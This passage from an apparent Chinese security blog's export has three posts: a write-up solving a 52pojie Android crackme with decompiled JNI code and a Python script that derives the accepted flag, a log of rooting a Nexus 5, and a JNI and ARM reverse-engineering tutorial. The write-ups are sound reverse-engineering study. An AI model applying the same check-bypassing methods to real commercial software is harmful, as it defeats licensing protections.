\"java/lang/Integer\"; toHexString_ = \"toHexString\"; method2.fnPtr = \"(I)Ljava/lang/String;\"; zeroPad = 0; while ( 1 ) &#123; ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)( env_, md5Digest, j, 1, &amp;t_); t1 = (unsigned __int8)t_; if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) break; if ( t1 &lt;= 0xF ) // if x &lt; 0xF then append a zero &#123; if ( zeroPad ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, zeroPad); zeroPad = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, \"0\"); if ( !v44 ) &#123; method2.name = \"append\"; method2.signature = \"(Ljava/lang/String;)Ljava/lang/StringBuilder;\"; if ( getMethods(env_, &amp;v51, &amp;v44, 0, \"java/lang/StringBuilder\", method2) ) break; &#125; t_ = zeroPad; v24 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// append zero if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) break; if ( v24 ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v24); &#125; if ( !v43 ) &#123; *(_QWORD *)&amp;method2.name = __PAIR__((unsigned int)method2.fnPtr, (unsigned int)toHexString_); if ( getMethods(env_, &amp;v50, &amp;v43, 1, classInteger, method2) )// get toHexString method break; &#125; t_ = t1; t1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v50); if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) break; if ( arr_ ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, arr_); if ( !v44 ) &#123; method2.name = \"append\"; method2.signature = \"(Ljava/lang/String;)Ljava/lang/StringBuilder;\"; if ( getMethods(env_, &amp;v51, &amp;v44, 0, \"java/lang/StringBuilder\", method2) ) break; &#125; t_ = t1; key1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22); if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) break; if ( key1 ) ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, key1); ++j; arr_ = t1; if ( j &gt;= len__ ) goto LABEL_75; &#125; 最后将取字符串字符串的 1~31 位作为新的字符串，并与我们的输入进行比较： 123456789101112131415161718192021222324252627282930313233343536373839if ( !v42 ) &#123; method2.name = \"toString\"; method2.signature = \"()Ljava/lang/String;\"; if ( getMethods(env_, &amp;v51, &amp;v42, 0, \"java/lang/StringBuilder\", method2) ) goto LABEL_88; &#125; v25 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// convert StringBuilder to string if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v22); if ( !v25 ) goto LABEL_87; if ( !v41 ) &#123; method2.name = \"substring\"; method2.signature = \"(II)Ljava/lang/String;\"; if ( getMethods(env_, &amp;v49, &amp;v41, 0, \"java/lang/String\", method2) ) goto LABEL_88; &#125; v55 = 31; // slice 1-31 t_ = 1; v26 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v25); if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v25); if ( !v26 ) goto LABEL_87; if ( !v40 ) &#123; method2.name = \"equals\"; method2.signature = \"(Ljava/lang/Object;)Z\"; if ( getMethods(env_, &amp;v49, &amp;v40, 0, \"java/lang/String\", method2) ) goto LABEL_88; &#125; t_ = v39; v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v26);// compare string if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) ) goto LABEL_88; 只需要正向地实现就能得到对应的字符串，我这里用 Python 实现了一下： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env pythonimport hashlibkey = 'thisiskey52pojie_2020_happy_chinese_new_year20200125'key1 = key[:0x7D-0x74]key2 = key[0x7D-0x74:0xA0-0x74]key3 = key[0xA0-0x74:]arr = ''for i in range(35): if not i or i &amp; 3: arr += key2[i] else: arr += key3[(i &gt;&gt; 2) - 1]print arrmd5str = hashlib.md5(arr).digest()print md5str.encode('hex')xorlist = []for i in range(16): xorlist.append(ord(key1[i % 9]) ^ ord(md5str[i]))print xorlistflag = ''for i in range(16): flag += hex(xorlist[i])[2:].zfill(2)print flagflag = flag[1:31]print flagassert len(flag) == 30 跑出来后在手机上验证一下结果的正确性： 回复公众号得到口令： 【春节】解题领红包之四用 jadx 分析，在 onCreate() 函数中，需要输入 uid 和目标字符串，其中 uid 用 0 补齐成 7 位。然后调用在 Native 层实现的 checkSn() 函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.wuaipojie.crackme02;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity &#123; private Button btn; private EditText input_flag; private EditText input_uid; public native boolean checkSn(String str, String str2); static &#123; System.loadLibrary(\"xtian\"); &#125; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); this.input_uid = (EditText) findViewById(R.id.input_uid); this.input_flag = (EditText) findViewById(R.id.input_flag); Button button = (Button) findViewById(R.id.button); this.btn = button; button.setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; view = MainActivity.this.input_uid.getText().toString().trim(); if (view.length() &lt; 7) &#123; int length = 7 - view.length(); StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i &lt; length; i++) &#123; stringBuilder.append(\"0\"); &#125; StringBuilder stringBuilder2 = new StringBuilder(); stringBuilder2.append(stringBuilder.toString()); stringBuilder2.append(view); view = stringBuilder2.toString(); &#125; MainActivity mainActivity = MainActivity.this; if (mainActivity.checkSn(view, mainActivity.input_flag.getText().toString().trim()) != null) &#123; Toast.makeText(MainActivity.this, \"\\u6b63\\u786e\\uff01\\uff01\\uff01\\u8bf7\\u628a\\u7ed3\\u679c\\u76f4\\u63a5\\u63d0\\u4ea4\\u5230\\u8bba\\u575b\\u9886\\u53d6\\u5956\\u52b1\\u5427\", 0).show(); &#125; else &#123; Toast.makeText(MainActivity.this, \"\\u9a8c\\u8bc1\\u9519\\u8bef\\uff0c\\u7ee7\\u7eed\\u52a0\\u6cb9\", 0).show(); &#125; &#125; &#125;); &#125;&#125; 把 unicode 输出，可以看到通过了 checkSn 的检测就成功了： 12345In [1]: print u&quot;\\u6b63\\u786e\\uff01\\uff01\\uff01\\u8bf7\\u628a\\u7ed3\\u679c\\u76f4\\u63a5\\u63d0\\u4ea4\\u5230\\u8bba\\u575b\\u9886\\u53d6\\u5956\\u52b1\\u5427&quot;正确！！！请把结果直接提交到论坛领取奖励吧In [2]: print u&quot;\\u9a8c\\u8bc1\\u9519\\u8bef\\uff0c\\u7ee7\\u7eed\\u52a0\\u6cb9&quot;验证错误，继续加油 接下来打开 IDA 分析一下 so 文件。没有找到 checkSn 函数，基本上都被混淆了，说明函数是被动态注册的。JNI_OnLoad 的部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172void __fastcall __noreturn JNI_OnLoad(_JavaVM *vm)&#123; _JavaVM *vm_; // r11 signed int v2; // r2 int v3; // lr int (__fastcall *v4)(_JavaVM *, int *, signed int); // r4 int v5; // lr signed int i; // r12 int v7; // [sp+8h] [bp-C0h] int *v8; // [sp+10h] [bp-B8h] int v9; // [sp+18h] [bp-B0h] int v10; // [sp+20h] [bp-A8h] int v11; // [sp+28h] [bp-A0h] int v12; // [sp+30h] [bp-98h] int *v13; // [sp+38h] [bp-90h] int v14; // [sp+40h] [bp-88h] signed int v15; // [sp+48h] [bp-80h] int v16; // [sp+50h] [bp-78h] int *v17; // [sp+7Ch] [bp-4Ch] void *v18; // [sp+80h] [bp-48h] int *v19; // [sp+84h] [bp-44h] int *v20; // [sp+88h] [bp-40h] int *v21; // [sp+8Ch] [bp-3Ch] int *v22; // [sp+90h] [bp-38h] int *v23; // [sp+94h] [bp-34h] int *v24; // [sp+98h] [bp-30h] void **v25; // [sp+9Ch] [bp-2Ch] signed int *v26; // [sp+A0h] [bp-28h] vm_ = vm; v23 = &amp;Oo0O_8; v24 = &amp;O0OO_9; v18 = &amp;_stack_chk_guard; v2 = 0; if ( O0OO_9 &lt; 10 ) v2 = 1; v3 = v2 | ~((Oo0O_8 - 1) * Oo0O_8) &amp; 1; if ( v3 != 1 ) goto LABEL_5; while ( 1 ) &#123; v26 = &amp;v15; v15 = 0x58D3C185; v12 = 0x58D3C185; v13 = &amp;v10; if ( v3 ) &#123; v22 = &amp;v11; v17 = (int *)&amp;v13; v20 = &amp;v16; v21 = &amp;v12; v4 = (int (__fastcall *)(_JavaVM *, int *, signed int))(*((_DWORD *)off_1D7B0 + 0x1FEC2733) - 0x58D3C184); v14 = v4(vm, &amp;v10, 0x10004); v5 = *v23; for ( i = *v24; *v24 &gt;= 10 &amp;&amp; ((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1; i = *v24 ) &#123; v14 = v4(vm_, &amp;v10, 0x10004); v14 = v4(vm_, &amp;v10, 0x10004); v5 = *v23; &#125; v19 = &amp;v14; v25 = &amp;off_1D7B0; if ( i &lt; 10 || !(((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1) ) JUMPOUT(__CS__, *((_DWORD *)off_1D7B4 + 0x1FEC27A2) - 0x49F16B40); while ( 1 ) ; &#125;LABEL_5: v9 = 0x58D3C185; v8 = &amp;v7; &#125;&#125; TODO: Referenceshttps://www.52pojie.cn/thread-732955-1-1.htmlhttps://www.52pojie.cn/thread-749955-1-1.htmlhttps://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-examplehttps://www.52pojie.cn/thread-1101266-1-1.htmlhttps://www.bodkin.ren/index.php/archives/533/https://www.52pojie.cn/thread-778654-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"Nexus5刷机、Root并安装Xposed框架","slug":"Nexus5刷机、Root并安装Xposed框架","date":"2020-02-05T06:59:47.000Z","updated":"2020-02-25T23:54:41.658Z","comments":true,"path":"2020/02/05/Nexus5刷机、Root并安装Xposed框架/","link":"","permalink":"blog.b3ale.cn/2020/02/05/Nexus5刷机、Root并安装Xposed框架/","excerpt":"在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。","text":"在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。 查看设备名称： 12shell@hammerhead:/ $ getprop ro.product.devicehammerhead 解锁先使用 adb 命令进入 bootloader 模式： 1$ adb reboot bootloader 这部机子一开始已经解锁了，所以会报错： 123$ fastboot oem unlock FAILED (remote: 'Already Unlocked')fastboot: error: Command failed 刷机刷机一般是采用官方的镜像，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 flash-all.sh： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576$ adb reboot bootloader$ fastboot devices0b83c85e00ce15f9 fastboot$ ./flash-all.shSending 'bootloader' (2508 KB) OKAY [ 0.290s]Writing 'bootloader' OKAY [ 0.497s]Finished. Total time: 0.981sRebooting into bootloader OKAY [ 0.094s]Finished. Total time: 0.094sSending 'radio' (45409 KB) OKAY [ 1.640s]Writing 'radio' OKAY [ 3.105s]Finished. Total time: 4.975sRebooting into bootloader OKAY [ 0.106s]Finished. Total time: 0.106s--------------------------------------------Bootloader Version...: HHZ11kBaseband Version.....: M8974A-2.0.50.1.13Serial Number........: 0b83c85e00ce15f9--------------------------------------------extracting android-info.txt (0 MB) to RAM...Checking 'product' OKAY [ 0.097s]Checking 'version-bootloader' OKAY [ 0.100s]Checking 'version-baseband' OKAY [ 0.100s]extracting boot.img (8 MB) to disk... took 0.038sarchive does not contain 'boot.sig'Sending 'boot' (8700 KB) OKAY [ 0.490s]Writing 'boot' OKAY [ 0.749s]archive does not contain 'dtbo.img'archive does not contain 'dt.img'extracting recovery.img (9 MB) to disk... took 0.039sarchive does not contain 'recovery.sig'Sending 'recovery' (9284 KB) OKAY [ 0.510s]Writing 'recovery' OKAY [ 0.776s]archive does not contain 'vbmeta.img'archive does not contain 'vbmeta_system.img'archive does not contain 'super_empty.img'archive does not contain 'odm.img'archive does not contain 'product.img'extracting system.img (704 MB) to disk... took 3.704sarchive does not contain 'system.sig'Sending 'system' (721400 KB) OKAY [ 22.834s]Writing 'system' OKAY [ 49.509s]archive does not contain 'system_ext.img'archive does not contain 'vendor.img'Erasing 'userdata' OKAY [ 15.664s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 7137786 4k blocks and 1785856 inodesFilesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: doneSending 'userdata' (4416 KB) OKAY [ 0.244s]Writing 'userdata' OKAY [ 0.495s]Erasing 'cache' OKAY [ 0.600s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 179200 4k blocks and 44832 inodesFilesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275dSuperblock backups stored on blocks: 32768, 98304, 163840Allocating group tables: doneWriting inode tables: doneCreating journal (4096 blocks): doneWriting superblocks and filesystem accounting information: doneSending 'cache' (428 KB) OKAY [ 0.211s]Writing 'cache' OKAY [ 0.219s]Rebooting OKAY [ 0.100s]Finished. Total time: 100.120s 完成后，如果没有什么故障，稍过片刻就能打开新的系统了。 我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 /data 和 /cache 进行格式化，照着这篇文章对系统进行双清后，容量恢复到了正常状态。 Root刷完机后，可以进行 root 了。下载 Android Root 包 CF-Auto-Root-hammerhead-hammerhead-nexus5.zip 并解压进入目录。在 macOS 下时，提供的 fastbootm-mac 的版本过老，使用时会报错： 12$ tools/fastboot-mac --versionfastboot version 09a0d98bebce-android 本地的 fastboot 版本更新，所以我把 tools 中的工具替换为了本地的 /usr/local/bin/fastboot： 123$ fastboot --versionfastboot version 29.0.2-5738569Installed as /usr/local/bin/fastboot 然后进入 bootloader，并执行 root-mac.sh： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263$ adb reboot bootloader$ ./root-mac.sh----- CF-Auto-Root-hammerhead-hammerhead-nexus5 -----If you are on Android 5.0 or newer, please make sure the &quot;Allow OEM Unlock&quot;option (if present) is enabled in &quot;Settings-&gt;Developer Options&quot;.If you cannot find &quot;Developer Options&quot; under &quot;Settings&quot;, first go to the&quot;Settings-&gt;About&quot; screen, find the &quot;Build number&quot; entry, and tap it 7 times.----- ----- ----- ----- ----- ----- -----Please make sure your device is in bootloader/fastboot mode before continuing.----- ----- ----- ----- ----- ----- -----***WARNING*** ALL YOUR DATA *MAY* BE WIPED ! ***WARNING***We are going to run the &quot;OEM UNLOCK&quot; command on your device. If your devicewas not previously unlocked, this will wipe all your data !Please watch the screen on your device, user input may be required.You may need to enter your administrator password to continue.Press Ctrl+C to cancel !Press ENTER to continuePassword:----- ----- ----- ----- ----- ----- -----If you just unlocked for the first time, it is advised to boot the device intoAndroid before continuing. This first boot may take several minutes, sometimeseven half an hour.If you decide to boot back into Android first, return your device tobootloader/fastboot mode before continuing again.Press Ctrl+C to cancel !Press ENTER to continue----- ----- ----- ----- ----- ----- -----We will now attempt to boot CF-Auto-Root. You should see a red Android on thescreen of your device in a minute, with scrolling white text on top of it.Sending &apos;boot.img&apos; (15868 KB) OKAY [ 0.605s]Booting OKAY [ 0.121s]Finished. Total time: 0.747sIf nothing happens even after several minutes, something may be wrong.Once CF-Auto-Root is done, it will reboot your device. Keep in mind that yourdevice may reboot a number of times, and it may be a few minutes before youare back into Android. It is important that you do not interrupt this process,unless it takes more than five minutes in total.Press ENTER to continue 成功后，手机会出现一个红色的安卓标志： 打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root： 12345$ adb shellshell@hammerhead:/ $ suroot@hammerhead:/ # iduid=0(root) gid=0(root) context=u:r:init:s0root@hammerhead:/ # TWRP下载 twrp-3.3.1-0-hammerhead.img，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启： 123456789$ adb reboot bootloader$ fastboot flash recovery twrp-3.3.1-0-hammerhead.imgSending &apos;recovery&apos; (13290 KB) OKAY [ 0.630s]Writing &apos;recovery&apos; OKAY [ 1.040s]Finished. Total time: 1.863s$ fastboot rebootRebooting OKAY [ 0.001s]Finished. Total time: 0.001s XposedAndroid 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 Xposed Installer 来安装 Xposed 框架： 12345$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apkPerforming Push Installapks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s) pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apkSuccess Referenceshttps://www.bodkin.ren/index.php/archives/513/https://jilu.wiki/d/177https://blog.csdn.net/feiniao8651/article/details/70083246/https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193https://sspai.com/post/24538","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"Android逆向入门（二）","slug":"Android逆向入门（二）","date":"2020-01-31T08:10:49.000Z","updated":"2020-02-12T14:28:59.450Z","comments":true,"path":"2020/01/31/Android逆向入门（二）/","link":"","permalink":"blog.b3ale.cn/2020/01/31/Android逆向入门（二）/","excerpt":"Android JNI 编程及 ARM 汇编入门。","text":"Android JNI 编程及 ARM 汇编入门。 EnvironmentAndroid Studio 3.5.3 JNIAndroid 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。 如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 log.h 定义几个在 C++ 文件中进行日志输出的函数： 12345678910#include &lt;android/log.h&gt;#ifndef LOG_TAG#define LOG_TAG \"MY_TAG\"#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endif 在 Java 文件中添加日志输出： 12345678910public class MainActivity extends AppCompatActivity &#123; ... @Override protected void onCreate(Bundle savedInstanceState) &#123; ... Log.d(\"Debug\", \"infomation\"); &#125; ...&#125; 在需要调用 JNI 的函数中加载动态库： 12345678public class MainActivity extends AppCompatActivity &#123; // Used to load the 'native-lib' library on application startup. static &#123; System.loadLibrary(\"native-lib\"); &#125; ...&#125; Native 函数注册静态注册静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。 Java 文件中的 Native 声明： 1public native String sayHello(); 静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 JNIEnv* env 和 jclass（static 方法时）/jobject（普通方法时）： 12345678910#include &lt;jni.h&gt;#include &lt;string&gt;#include \"log.h\"extern \"C\" &#123;JNIEXPORT jstring JNICALLJava_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) &#123; return env-&gt;NewStringUTF(\"Hello World\");&#125;&#125; 静态注册有一些缺点： Native 函数名称特别长，不利于书写； 每次新增或删除接口时需要重新生成文件，比较繁琐； 第一次调用时需要根据函数名建立索引，影响效率； JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。 动态注册动态注册在 JNI 层通过重载 JNI_OnLoad() 函数来实现，系统初始化 JNI 在加载时，会调用 JNI_OnLoad()，而卸载时会调用 JNI_UnLoad()。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。 cpp 文件中的函数定义如下： 123jstring sayHi(JNIEnv *env, jobject obj) &#123; return env-&gt;NewStringUTF(\"Hi World\");&#125; 通过内置函数 RegisterNatives() 实现自定义的注册方法： 1234567891011static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) &#123; jclass clazz; clazz = env-&gt;FindClass(className); if (clazz == NULL) &#123; return JNI_FALSE; &#125; if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123; return JNI_FALSE; &#125; return JNI_TRUE;&#125; 定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息： 1234static const char *gClassName = \"com/assassinq/easycpp/MainActivity\";static JNINativeMethod gMethods[] = &#123; &#123;\"sayHi\", \"()Ljava/lang/String;\", (void *) sayHi&#125;,&#125;; 其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针： 12345typedef struct &#123; const char* name; // native 的方法名 const char* signature; // 方法签名，例如 ()Ljava/lang/String; void* fnPtr; // 函数指针&#125; JNINativeMethod; 最后重写 JNI_OnLoad() 函数： 12345678910111213JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = NULL; if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGE(\"This jni version is not supported\"); return -1; &#125; if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) &#123; LOGE(\"Unable to register native methods\"); return -1; &#125; LOGE(\"Methods loaded successfully\"); return JNI_VERSION_1_6;&#125; so 动态链接库在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库： 12345678910android &#123; ... defaultConfig &#123; ... ndk &#123; abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot; &#125; &#125; ...&#125; so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）： armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。 arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。 armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。 x86：Intel x86（平板、模拟器用得比较多）。 x86_64：Intel x64（64 位的平板）。 … IDA 反编译 so 文件用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so： 查看静态注册函数的反编译结果： 1234int __fastcall Java_com_assassinq_easycpp_MainActivity_sayHello(_JNIEnv *a1)&#123; return _JNIEnv::NewStringUTF(a1, \"Hello World\");&#125; 查看动态注册的函数的反编译结果： 1234int __fastcall sayHi(_JNIEnv *a1)&#123; return _JNIEnv::NewStringUTF(a1, \"Hi World\");&#125; IDA 动态调试 apk 安装 apk 到手机：adb install example.apk 将 IDA 目录下的调试文件 push 到手机上：adb push android_server /data/local/tmp 赋给程序可执行权限：chmod 777 android_server 启动调试服务端：./android_server （自定义设置端口方式：-p23333） 手机端端口转发至电脑端：adb forward tcp:[pc_port] tcp:[mobile_port] IDA 调试端口设置：Debugger-&gt;Process option 启动程序：adb shell am start -D -n packageName/activityName IDA 挂接到 Native 层：Debugger-&gt;Attach to process… 打开 monitor，监听并挂接到 JAVA 层：jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 android:debuggable=&quot;true&quot;（若没有则修改后并重新打包）。 动态链接库文件（.so 文件）加载顺序： 1init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array so 文件查看工具readelf 参数 功能 -a 显示 so 文件的所有信息 -h 显示 ELF 文件头 -l 显示 Program Headers，动态加载时需要的信息 -S 显示 Section Headers，静态加载分析时需要的信息 -e 显示 ELF Header、Section Headers、Program Headers 信息 -s 显示符号表（Symbol Table） -d 显示动态节区（Dynamic Section） 显示 ELF 文件头： 123456789101112131415161718192021$ readelf -h libnative-lib.soELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: ARM Version: 0x1 Entry point address: 0x0 Start of program headers: 52 (bytes into file) Start of section headers: 12932 (bytes into file) Flags: 0x5000200, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 40 (bytes) Number of section headers: 27 Section header string table index: 26 显示 Program headers： 123456789101112131415161718192021222324252627$ readelf -l libnative-lib.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00100 0x00100 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000 LOAD 0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW 0x1000 DYNAMIC 0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW 0x4 NOTE 0x000134 0x00000134 0x00000134 0x000bc 0x000bc R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 EXIDX 0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R 0x4 GNU_RELRO 0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW 0x4 Section to Segment mapping: Segment Sections... 00 01 .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata 02 .fini_array .data.rel.ro .dynamic .got .data .bss 03 .dynamic 04 .note.android.ident .note.gnu.build-id 05 06 .ARM.exidx 07 .fini_array .data.rel.ro .dynamic .got 显示 Section headers： 123456789101112131415161718192021222324252627282930313233343536$ readelf -S libnative-lib.soThere are 27 section headers, starting at offset 0x3284:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .note.android.ide NOTE 00000134 000134 000098 00 A 0 0 4 [ 2] .note.gnu.build-i NOTE 000001cc 0001cc 000024 00 A 0 0 4 [ 3] .dynsym DYNSYM 000001f0 0001f0 000190 10 A 4 1 4 [ 4] .dynstr STRTAB 00000380 000380 0001d3 00 A 0 0 1 [ 5] .gnu.hash GNU_HASH 00000554 000554 00004c 04 A 3 0 4 [ 6] .hash HASH 000005a0 0005a0 0000b0 04 A 3 0 4 [ 7] .gnu.version VERSYM 00000650 000650 000032 02 A 3 0 2 [ 8] .gnu.version_d VERDEF 00000684 000684 00001c 00 A 4 1 4 [ 9] .gnu.version_r VERNEED 000006a0 0006a0 000040 00 A 4 2 4 [10] .rel.dyn REL 000006e0 0006e0 0000e8 08 A 3 0 4 [11] .rel.plt REL 000007c8 0007c8 000088 08 AI 3 20 4 [12] .plt PROGBITS 00000850 000850 0000e0 00 AX 0 0 4 [13] .text PROGBITS 00000930 000930 0018c4 00 AX 0 0 4 [14] .ARM.exidx ARM_EXIDX 000021f4 0021f4 0001b8 08 